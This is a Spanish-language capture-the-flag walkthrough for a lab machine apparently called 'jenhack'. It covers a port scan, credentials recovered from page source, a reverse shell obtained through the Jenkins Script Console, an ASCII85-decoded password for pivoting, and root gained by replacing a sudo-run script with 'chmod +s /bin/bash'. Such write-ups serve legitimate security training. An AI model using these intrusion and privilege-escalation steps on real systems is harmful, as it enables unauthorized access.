PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy

-Entramos a la web por el puerto 80, observamos el código fuente y conseguimos unas posibles credenciales
	-user: jenkins-admin
	-password: cassandra

-Nos autenticamos por el puerto 8080 en el panel de login:
	-http://jenhack:8080/

-Dentro del dashboard de Jenkins , obtenemos acceso a la máquina de la siguiente manera:
	-Manage Jenkins -->Script Console
	-Buscamos https://www.revshells.com/ y copiamos la reverse shell de tipo 'Groovy', con el tipo de shell 'sh'
	-Lo pegamos en la consola de jenkins y obtenemos acceso.
	jenkins@fa3faa860b76:

## Escalada de Privilegios

-En la siguiente ruta encontramos credenciales para pivotar al usuario 'jenhack':
	-jenkins@fa3faa860b76:/var/www/jenkhack$ cat note.txt 
	-jenkhack:C1V9uBl8!'Ci*`uDfP
	-Nos vamos a 'Cipher Identifier' y decodificamos la clave ASCII85
	-Clave desencriptada: jenkinselmejor

-Pivotamos al usuario jenhack

-jenkhack@fa3faa860b76:/$ sudo -l:
	(ALL : ALL) NOPASSWD: /usr/local/bin/bash

-Investigamos el contenido del binario:
	-strings /usr/local/bin/bash
		-Ejecuta el siguiente script: /opt/bash.sh

-Nos vamos a /opt, no podemos editar el script, sin embargo, podemos borrarlo y crear un archivo que se llame igual con el contenido que nosotros queramos:
	-rm bash.sh
	-nano bash.sh
	-chmod +s /bin/bash

-Ejecutamos el binario inicial con sudo:
	-sudo /usr/local/bin/bash

-Elevamos nuestra shell a root:
	-/bin/bash -p
	bash-5.2# whoami
	root



